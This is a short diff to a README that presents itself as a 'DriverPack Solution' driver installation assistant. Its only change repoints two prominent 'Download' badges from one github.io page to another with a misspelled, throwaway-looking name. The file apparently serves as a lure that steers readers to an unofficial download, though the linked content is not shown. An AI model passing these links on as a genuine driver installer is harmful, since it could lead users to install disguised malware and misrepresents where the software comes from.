@@ -1,7 +1,7 @@
 # 🧰 DriverPack Solution — Driver Installation Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-blue?style=for-the-badge)](https://driverpack-solution-tool.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-cyan?style=for-the-badge&logo=windows)](https://driverpack-solution-tool.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-blue?style=for-the-badge)](https://packdrivver56web09tool.github.io/.github/)  
+[![Download Now](https://img.shields.io/badge/Download_Now-cyan?style=for-the-badge&logo=windows)](https://packdrivver56web09tool.github.io/.github/)
 
 ---
 
